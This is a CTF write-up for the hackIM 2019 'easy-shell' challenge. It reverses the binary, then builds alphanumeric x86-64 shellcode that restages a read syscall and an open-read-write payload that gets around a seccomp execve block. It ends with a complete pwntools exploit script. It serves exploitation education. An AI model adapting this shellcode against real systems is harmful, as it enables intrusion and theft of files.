# hackIM easy-shell

This writeup is based off of: https://lordidiot.github.io/2019-02-03/nullcon-hackim-ctf-2019/#easy-shell

### Reversing

Let's take a look at the binary:

```
$	file challenge 
challenge: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=17078c373870713a0e05bb52fccd823edf45f158, stripped
$	pwn checksec challenge 
[*] '/Hackery/hackIM/easy-shell/challenge'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
$	./challenge 
15935728
Epic Fail!
```

So it is a `64` bit binary, with RELRO, a Stack Canary, Non Executable Stack, and PIE. When we run the binary, it just scans in data and tells us we failed. When we look at the main function, we see this:

```
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  size_t pageSize; // rbx@1
  void *memoryPage; // rax@1
  void *memoryPageTrfs; // r12@3
  __int64 bytesRead; // rbp@4
  const unsigned __int16 **ctype; // rax@6
  __int64 curentChar; // rdx@6

  pageSize = -(signed __int16)getpagesize() & 0x4000;
  memoryPage = mmap(0LL, pageSize, 7, 34, -1, 0LL);
  if ( !memoryPage )
    __assert_fail("psc != NULL", "gg.c", 0x76u, "main");
  memoryPageTrfs = memoryPage;
  fflush(stdout);
  while ( 1 )
  {
    bytesRead = (signed int)read(0, memoryPageTrfs, pageSize);
    *((_BYTE *)memoryPageTrfs + bytesRead) = -61;
    while ( (_DWORD)bytesRead )
    {
      ctype = __ctype_b_loc();
      curentChar = *((char *)memoryPageTrfs + bytesRead-- - 1);
      if ( !((*ctype)[curentChar] & 0xC00) )
      {
        sub_D0C("Epic Fail!", memoryPageTrfs);
        exit(-1);
      }
    }
    ((void (__fastcall *)(_QWORD, void *))memoryPageTrfs)(0LL, memoryPageTrfs);
  }
}
```

So we can see that it starts off allocating a page of memory with `mmap`. Proceeding that it will scan in input with `read` into that page (amount equal to the size requested). With gdb, we can see that the memory page that is allocated has the `RWX` permissions, with pie breakpoints with gdb-gef.

First start the program:
```
gef➤  entry-break
```

then set the pie breakpoint:

```
gef➤  pie b *0xb59
gef➤  c
```

after that, I just gave the string `15935728` as input

```
gef➤  search-pattern 15935728
[+] Searching '15935728' in memory
[+] In (0x7ffff7ff3000-0x7ffff7ff7000), permission=rwx
  0x7ffff7ff3000 - 0x7ffff7ff3008  →   "15935728" 
```

This command was ran right after the `read` call. We can see here that the permission of the memeory segment it is in is `RWX`. After that, we see there is a while loop that will either loop through all of the characters of our input, or exit and call us a looser:

```
    while ( (_DWORD)bytesRead )
    {
      ctype = __ctype_b_loc();
      curentChar = *((char *)memoryPageTrfs + bytesRead-- - 1);
      if ( !((*ctype)[curentChar] & 0xC00) )
      {
        sub_D0C("Epic Fail!", memoryPageTrfs);
        exit(-1);
      }
```

So what it appears to be doing, is first grabbing a pointer to a region of memory. Then it appears to take a character starting from the end of our string (each time it does, `bytesRead` gets decremented). Then it uses that character as an index for the memory region, grabs to bytes of data from the address, and ands it with `0x0c00`. If the output is `0`, we get called a looser, and if the input isn't zero the loop continues through to the rest of the characters. Let's see what that memory region looks like:

First set a breakpoint for the instruction where it's evaluated:
```
gef➤  pie b *0xb76
```

When we get there, we can see that the memory pointed to by `ctype` looks like this:
```
Breakpoint 1, 0x0000555555554b76 in ?? ()
gef➤  x/60g $rax
0x7ffff7b82cc0 <_nl_C_LC_CTYPE_class+256>:	0x0002000200020002	0x0002000200020002
0x7ffff7b82cd0 <_nl_C_LC_CTYPE_class+272>:	0x2002200220030002	0x0002000220022002
0x7ffff7b82ce0 <_nl_C_LC_CTYPE_class+288>:	0x0002000200020002	0x0002000200020002
0x7ffff7b82cf0 <_nl_C_LC_CTYPE_class+304>:	0x0002000200020002	0x0002000200020002
0x7ffff7b82d00 <_nl_C_LC_CTYPE_class+320>:	0xc004c004c0046001	0xc004c004c004c004
0x7ffff7b82d10 <_nl_C_LC_CTYPE_class+336>:	0xc004c004c004c004	0xc004c004c004c004
0x7ffff7b82d20 <_nl_C_LC_CTYPE_class+352>:	0xd808d808d808d808	0xd808d808d808d808
0x7ffff7b82d30 <_nl_C_LC_CTYPE_class+368>:	0xc004c004d808d808	0xc004c004c004c004
0x7ffff7b82d40 <_nl_C_LC_CTYPE_class+384>:	0xd508d508d508c004	0xc508d508d508d508
0x7ffff7b82d50 <_nl_C_LC_CTYPE_class+400>:	0xc508c508c508c508	0xc508c508c508c508
0x7ffff7b82d60 <_nl_C_LC_CTYPE_class+416>:	0xc508c508c508c508	0xc508c508c508c508
0x7ffff7b82d70 <_nl_C_LC_CTYPE_class+432>:	0xc004c508c508c508	0xc004c004c004c004
0x7ffff7b82d80 <_nl_C_LC_CTYPE_class+448>:	0xd608d608d608c004	0xc608d608d608d608
0x7ffff7b82d90 <_nl_C_LC_CTYPE_class+464>:	0xc608c608c608c608	0xc608c608c608c608
0x7ffff7b82da0 <_nl_C_LC_CTYPE_class+480>:	0xc608c608c608c608	0xc608c608c608c608
0x7ffff7b82db0 <_nl_C_LC_CTYPE_class+496>:	0xc004c608c608c608	0x0002c004c004c004
0x7ffff7b82dc0 <_nl_C_LC_CTYPE_class+512>:	0x0000000000000000	0x0000000000000000
0x7ffff7b82dd0 <_nl_C_LC_CTYPE_class+528>:	0x0000000000000000	0x0000000000000000
0x7ffff7b82de0 <_nl_C_LC_CTYPE_class+544>:	0x0000000000000000	0x0000000000000000
0x7ffff7b82df0 <_nl_C_LC_CTYPE_class+560>:	0x0000000000000000	0x0000000000000000
0x7ffff7b82e00 <_nl_C_LC_CTYPE_class+576>:	0x0000000000000000	0x0000000000000000
0x7ffff7b82e10 <_nl_C_LC_CTYPE_class+592>:	0x0000000000000000	0x0000000000000000
0x7ffff7b82e20 <_nl_C_LC_CTYPE_class+608>:	0x0000000000000000	0x0000000000000000
0x7ffff7b82e30 <_nl_C_LC_CTYPE_class+624>:	0x0000000000000000	0x0000000000000000
0x7ffff7b82e40 <_nl_C_LC_CTYPE_class+640>:	0x0000000000000000	0x0000000000000000
0x7ffff7b82e50 <_nl_C_LC_CTYPE_class+656>:	0x0000000000000000	0x0000000000000000
0x7ffff7b82e60 <_nl_C_LC_CTYPE_class+672>:	0x0000000000000000	0x0000000000000000
0x7ffff7b82e70 <_nl_C_LC_CTYPE_class+688>:	0x0000000000000000	0x0000000000000000
0x7ffff7b82e80 <_nl_C_LC_CTYPE_class+704>:	0x0000000000000000	0x0000000000000000
0x7ffff7b82e90 <_nl_C_LC_CTYPE_class+720>:	0x0000000000000000	0x0000000000000000
```

So we can see that there are a lot of two byte pairs that are repeated. I'm just going to check to see what pairs when xored by `0x0c00` don't equal `0`:

```
0x0c00 & 0x0002 = 0
0x0c00 & 0x2003 = 0
0x0c00 & 0x2002 = 0
0x0c00 & 0x6001 = 0
0x0c00 & 0xc004 = 0
0x0c00 & 0xd808 = 2048
0x0c00 & 0xd508 = 1024
0x0c00 & 0xc508 = 1024
0x0c00 & 0xd508 = 1024
0x0c00 & 0xc608 = 1024
```

from those values, we can find out that the following indexes will not result in being called a looser:
```
048 - 057 (0x30 - 0x39) '0 - 9'
065 - 122 (0x41 - 0x7a) 'A - z'
```

So essentially, the only characters we can input to not get called a looser (aka the `Epic Fail`) are `0-9`, `A-Z`, and `a-z`. However if we pass that, the code we sent gets executed:

```
    ((void (__fastcall *)(_QWORD, void *))memoryPageTrfs)(0LL, memoryPageTrfs);
```

In addition to that, there is another restriction placed on our shellcode, in the form of seccomp rules. We can just use seccomp-tools from `https://github.com/david942j/seccomp-tools` to see these:
```
$	seccomp-tools dump ./challenge 
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x03 0xc000003e  if (A != ARCH_X86_64) goto 0005
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0005
 0004: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0005: 0x06 0x00 0x00 0x00051234  return ERRNO(4660)
```

So we can see that if we try to run `execve`, it will go to `0005` which kills the program. So we can't use `execve` with our shellcode.

### Crafting Shellcode

Since we can send input that get's executed, we are going to send shellcode. However due to the `execve` and `0-9` `A-z` character restriction, we will have to craft our own special shellcode. The plan here is to use our shellcode to essentially scan in input into the `rwx` memory (with a syscall to read) where our shellcode is. This will allow us to scan in shellcode without the character restriction, which we will use to get the flag. First let's see what status of the registers are when our shellcode runs (by setting a breakpoint `pie b * 0xb94`).

```
$rax   : 0x0               
$rbx   : 0x4000            
$rcx   : 0x00007f4c9cf50081  →  0x5777fffff0003d48 ("H="?)
$rdx   : 0x31              
$rsp   : 0x00007ffef3318d10  →  0x0000000000000000
$rbp   : 0x0               
$rsi   : 0x00007f4c9d454000  →  0x3832373533393531 ("15935728"?)
$rdi   : 0x0               
$rip   : 0x0000564e1b0dfb94  →   call r12
$r8    : 0x00007f4c9d22d8c0  →  0x0000000000000000
$r9    : 0x00007f4c9d440500  →  0x00007f4c9d440500  →  [loop detected]
$r10   : 0x22              
$r11   : 0x0000000000000246
$r12   : 0x00007f4c9d454000  →  0x3832373533393531 ("15935728"?)
$r13   : 0x00007ffef3318e00  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
```

Now for the syscall to read, we will have the following registers to have the following values:

```
rax:	0x0:	specifies the read syscall
rdi:	0x0:	specifies that the input will come from stdin
rsi:	ptr to rwx region:	specifies memory address to scan in data
rdx:	0x4000:	specifies the amount of bytes to scan in, the reason 0x4000 is since it is in rbx it will be easy to move it
```

In addition to that, we will need to write the two byte opcode `0x0f 0x05` to make the syscall. Now when we look at a list of the x64 opcodes (http://ref.x86asm.net/coder64.html#two-byte) and see what opcodes we have that can get past the character restriction, we see these that are of use to us:
```
pop reg
push reg
xor dword ptr [rcx + imm8], eax
```

So our first step will be to write the two byte opcode for a syscall `0x0f 0x05` (however in memory it will be `\x05\x0f`). When we look at the contents of the regesters we see that there is a pointer to our input `15935728` in the `r12` and `rsi` registers. We can push either of those registers, and then pop it into the `rcx` registers, and then finally use the `xor dword ptr [rcx + imm8], eax` instruction to write to our shellcode. Howver since we can only use alphanumeric characters, we will need to find two alphanumeric characters that when we xor them together gives us `0xf` (and to more when we xor together we get `0x5`). Here is a quick python script for it:

```
import string

x = ""
x += string.letters
x += string.digits

for i in x:
    for j in x:
        y = ord(i) ^ ord(j)
        if y == 0xf:
            print "combo 0xf: " + i + " " + j
        if y == 0x5:
            print "combo 0x5: " + i + " " + j
```

When we run the script, we see that `a` and `d` gives us `0x5`, and `a` and `n` gives us `0xf`. The last thing we need is the offset that we give for the right with `rcx` (the `+ imma`) has to be an alphanumeric character. Since the smallest one we can fit in there is `0x30 ('0')` we will do that. However this will create a large offset between the end of our shellcode, and where the syscall instruction is that we will need to fill.

After that is done, we will need to zero out the `rax` register again. To do this, we can just push the `rdi` register onto the stack and then pop it's value into the `rax` register (since `rdi`s value is `0x0`). The `rdi` register value is already `0x0` so we don't need to worry about it. The `rsi` register already holds a pointer to the memory we want to write to, so we don't need to worry about it. For `rdx` we can just push `rbx`, then pop it's value into `rdx` to get it to hold the value `0x4000`.

After that, we will need something to fill the space between the end of our shellcode (the part which preps the syscall) and the syscall instruction. We can do this by just adding the instruction `push rax; pop rax` which after the instruction is done, doesn't effectively change anything (so we can use it kind of like a nop) and it's opcodes are made out of alphanumeric characters. Putting it all together here is our shellcode for the first read:

```
# Here is the shellcode which will do the prep for the syscal
# Also we need to appen the 'PP' (0x5050) in fron of the 'aa' (0x6161) since we need alphanumeric cha
racters there
sc0 = asm("""
push rsi
pop rcx
xor eax, 0x50506161
xor dword ptr [rcx + 0x30], eax
push rdi
pop rax
push rbx
pop rdx      
""")

# Appen our psuedo nops to the end of the shellcode 
nop = asm("push rax; pop rax")

while len(sc0) < 0x30:
    sc0 += nop

# Here are the other two characters which will be xored to get '\x05\x0f'
sc0 += "nd"
```

After we form and send that shellcode, we will be able to scan in shellcode into that region of memory without the alphanumeric character restriction, so we just have to worry about the `execve` restriction. The only thing we will have left to do is write the shellcode which will open the file, read it, then print it's contents. Let's go over that shellcode:

```
sub rsp, 0x1000
mov rsi, rsp
xor rdi, rdi
mov rdx, 0x100
xor rax, rax
syscall
```

Starting off we will do another read syscall. The purpose of this is to scan the name of the file we will be reading into memory. We start off by subtracting `0x1000` from `rsp`, since we will be using the pointer in `rsp` to scan in our data, we subtract `0x1000` from it to move it into a region of memory that doesn't have a lot of data already there. We then move the pointer in `rsp` to `rsi` to signify where we want the data to be scanned into. After that we xor `rdi` and `rax` by themselves to zero them out, to specify a read syscall with stdin (since stdin is 0). We also move `0x100` into `rdx` to specify to read up to `0x100` bytes.

```
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 2
syscall
```

Next we will run an open syscall to open the flag. We start off my moving the pointer in `rsp` (the one with the name of the file) into the `rdi` register, to specify the name. We then zero out the `rsi` and `rdx` registers, to specify that we just want to read from the file. Then we move the value `0x2` into the `rax` register to specify an open syscall.

```
mov rdi, rax
mov rsi, rsp
mov rdx, 0x100
xor rax, rax
syscall
``` 

Next we will read the contents of the file into the region of memory pointed to by `rsp`. Since after the `open` syscall, it's file handle is stored in the `rax` register, we just move it into `rdi` to specify where we are reading from. The rest of it is similar to the last read syscall.

```
mov rdi, 1
mov rsi, rsp
mov rdx, 0x100
mov rax, 1
syscall
```

Then finally we can just write the flag to standard out. We move `0x1` into `rdi` to spcify stdout. We move the pointer in `rsp` into `rsi` to specify what we want written. We move `0x100` into the `rdx` register to specify how much we want written. Then finally `0x1` into `rax` to specify a `write` syscall.

### Exploit
Putting it all together, we get the following shellcode:

```
# This exploit is based off of: https://lordidiot.github.io/2019-02-03/nullcon-hackim-ctf-2019/#easy-shell

from pwn import *

target = process('./challenge')
#gdb.attach(target)


context.arch = "amd64"

# Here is the shellcode which will do the prep for the syscal
# Also we need to appen the 'PP' (0x5050) in fron of the 'aa' (0x6161) since we need alphanumeric characters there
sc0 = asm("""
push rsi
pop rcx
xor eax, 0x50506161
xor dword ptr [rcx + 0x30], eax
push rdi
pop rax
push rbx
pop rdx      
""")

# Append our psuedo nops to the end of the shellcode 
nop = asm("push rax; pop rax")

while len(sc0) < 0x30:
    sc0 += nop

# Here are the other two characters which will be xored to get '\x05\x0f'
sc0 += "nd"

# Send the first shellcode
target.send(sc0)

# Build the second shellcode, check the writeup for detailed explanation
sc1 = asm("""
sub rsp, 0x1000
mov rsi, rsp
xor rdi, rdi
mov rdx, 0x100
xor rax, rax
syscall

mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 2
syscall

mov rdi, rax
mov rsi, rsp
mov rdx, 0x100
xor rax, rax
syscall

mov rdi, 1
mov rsi, rsp
mov rdx, 0x100
mov rax, 1
syscall
""")

# We have to send 0x32 characters before our shellcode, since after the previous syscall from sc0 is done, it will continue execution 0x32 bytes after the start of our input
target.send("0"*0x32 + sc1)

# Send "flag" for the filename to read
target.send("flag\x00")

target.interactive()
```
